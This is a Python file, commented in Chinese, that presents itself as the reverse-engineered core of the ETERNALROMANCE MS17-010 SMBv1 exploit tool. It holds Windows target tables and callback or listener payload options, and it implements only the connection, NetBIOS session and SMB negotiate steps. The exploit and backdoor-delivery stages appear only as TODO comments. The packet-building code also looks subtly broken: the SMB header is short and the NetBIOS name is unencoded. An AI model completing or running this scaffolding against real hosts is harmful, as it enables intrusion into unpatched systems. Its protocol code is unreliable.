"""eternal_romance — ETERNALROMANCE (MS17-010 / ETROMANCE) 利用核心逻辑。

Python 重写的 `Eternalromance-1.3.0.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 SMBv1 / NetBIOS 利用流程。

参数定义来源：Eternalromance-1.3.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60
DEFAULT_MAX_ATTEMPTS = 3

EXPLOIT_METHOD_VALUES = {
    "Default":         0,
    "Fish-in-a-barrel": 1,
    "Matched-pairs":    2,
    "Classic-Romance":  3,
}

CREDENTIALS_VALUES = {
    "Anonymous": 0,
    "Guest":     1,
    "Blank":     2,
    "Password":  3,
    "NTLM":      4,
}

OS_TARGET_VALUES = {
    "XP_SP0SP1_X86":   (5, 1, 0),
    "XP_SP2SP3_X86":   (5, 1, 2),
    "XP_SP1_X64":      (5, 2, 1),
    "XP_SP2_X64":      (5, 2, 2),
    "SERVER_2003_SP0": (5, 2, 0),
    "SERVER_2003_SP1": (5, 2, 1),
    "SERVER_2003_SP2": (5, 2, 2),
    "VISTA_SP0":       (6, 0, 0),
    "VISTA_SP1":       (6, 0, 1),
    "VISTA_SP2":       (6, 0, 2),
    "SERVER_2008_SP0": (6, 0, 0),
    "SERVER_2008_SP1": (6, 0, 1),
    "SERVER_2008_SP2": (6, 0, 2),
    "WIN7_SP0":        (6, 1, 0),
    "WIN7_SP1":        (6, 1, 1),
    "SERVER_2008R2_SP0": (6, 1, 0),
    "SERVER_2008R2_SP1": (6, 1, 1),
}

PAYLOAD_VALUES = {
    "Callback":   0,
    "Listener":   1,
}

PROTOCOL_VALUES = {
    "SMB": 0,
    "NBT": 1,
}


class EternalRomanceError(Exception):
    pass


def _parse_hex_buffer(value):
    """将十六进制字符串解析为字节串。空字符串返回 b""。"""
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EternalRomanceError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EternalRomanceError(f"无效的十六进制缓冲区: {value!r}") from exc


def build_smb_connect_request(target_ip, port, protocol="SMB"):
    """构建 SMBv1 会话请求（Session Request / NetBIOS）。"""
    name = b"*SMBSERVER"
    dest = b"*"
    body = name + b"\x00" + dest + b"\x00"
    length = len(body)
    packet = b"\x81\x00" + struct.pack(">H", length) + body
    return packet


def build_negotiate_protocol_request():
    """构建 SMBv1 协商请求（Negotiate Protocol）。"""
    command = 0x72  # SMB_COM_NEGOTIATE
    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    byte_count = len(dialects)
    smb = (
        b"\xffSMB"
        + struct.pack("B", command)
        + b"\x00" * 4                      # Status (NTSTATUS)
        + b"\x08"                          # Flags1: case insensitive
        + b"\x00" * 2                      # Flags2
        + b"\x00" * 2                      # PID high
        + b"\x00" * 8                      # Security features + reserved
        + b"\x00" * 8                      # TID, PID, UID, MID
        + b"\x00"                          # Word count
        + struct.pack("<H", byte_count)    # Byte count
        + dialects
    )
    return smb


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    pipe=None,
    protocol="SMB",
    exploit_method="Default",
    credentials="Anonymous",
    username=None,
    password=None,
    ntlm_hash=None,
    target_os=None,
    max_attempts=DEFAULT_MAX_ATTEMPTS,
    teardown_backdoor=False,
    payload="Callback",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    listen_port=None,
    callin_port=None,
    verbose=False,
):
    """执行 ETERNALROMANCE 利用序列。

    当前阶段：完成参数解析、凭证编码、目标连接与协商。
    具体 exploit 缓冲区（Transaction 泄漏、LargePageGroom、内存劫持、
    后门投递等）的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Protocol: {protocol}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Max attempts: {max_attempts}")
        print(f"[*] Exploit method: {exploit_method}")
        print(f"[*] Target OS: {target_os or 'auto'}")
        print(f"[*] Credentials: {credentials}")
        print(f"[*] Payload: {payload}")

    # 解析常量
    exploit_method_value = EXPLOIT_METHOD_VALUES[exploit_method]
    credentials_value = CREDENTIALS_VALUES[credentials]
    payload_value = PAYLOAD_VALUES[payload]
    protocol_value = PROTOCOL_VALUES[protocol]
    os_major = os_minor = os_sp = 0
    if target_os and target_os in OS_TARGET_VALUES:
        os_major, os_minor, os_sp = OS_TARGET_VALUES[target_os]

    # 解析十六进制缓冲区
    username_bytes = _parse_hex_buffer(username)
    password_bytes = _parse_hex_buffer(password)
    ntlm_hash_bytes = _parse_hex_buffer(ntlm_hash)

    if verbose:
        print(f"[*] Exploit method value: {exploit_method_value}")
        print(f"[*] Credentials value: {credentials_value}")
        print(f"[*] Payload value: {payload_value}")
        print(f"[*] Protocol value: {protocol_value}")
        print(f"[*] OS: major={os_major} minor={os_minor} sp={os_sp}")
        print(f"[*] Username: {len(username_bytes)} bytes")
        print(f"[*] Password: {len(password_bytes)} bytes")
        print(f"[*] NTLM hash: {len(ntlm_hash_bytes)} bytes")

    # 建立 TCP 连接
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EternalRomanceError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 NetBIOS Session Request
    session_request = build_smb_connect_request(target, port, protocol)
    sock.sendall(session_request)
    try:
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EternalRomanceError(f"Session Request 应答失败: {exc}") from exc

    if verbose:
        print(f"[*] Session 应答: {resp.hex()}")

    # 发送 SMB Negotiate Protocol
    negotiate = build_negotiate_protocol_request()
    sock.sendall(negotiate)
    try:
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EternalRomanceError(f"协商应答失败: {exc}") from exc

    if verbose:
        print(f"[*] Negotiate 应答: {resp.hex()[:128]}...")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - Transaction 泄漏 (Trans2 / NTCreateAndX)
    #   - LargePageGroom / 内存占位
    #   - 架构识别 (x86/x64)
    #   - Dispatch table 查找与内存劫持
    #   - 后门 (DoublePulsar 类) 投递与回连
    #   - Payload: Callback / Listener

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
